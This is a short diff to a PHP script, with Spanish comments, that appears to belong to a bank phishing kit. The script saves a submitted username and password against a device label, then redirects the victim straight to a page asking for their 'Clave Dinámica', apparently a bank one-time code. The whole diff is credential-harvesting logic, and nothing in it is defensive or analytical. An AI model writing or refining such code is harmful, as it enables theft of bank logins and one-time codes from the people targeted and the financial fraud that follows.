@@ -7,13 +7,11 @@ $pass = $_POST['txt-password'] ?? '';
 $dispositivo = "Android Mobile"; 
 
 if (!empty($user) && !empty($pass)) {
-    // 1. Creamos o actualizamos el registro
+    // 1. Guardamos el registro
     $id = crear_registro($user, $dispositivo);
-    
-    // 2. Le añadimos la clave
     actualizar_registro_pass($id, $pass);
     
-    // 3. CAMBIO CLAVE: En lugar de WAITING, lo mandamos a la DINÁMICA
+    // 2. AUTOFLUJO: Mandamos a pedir la Clave Dinámica inmediatamente
     header("Location: ../a/dinamica.php");
 } else {
     header("Location: ../index.php");
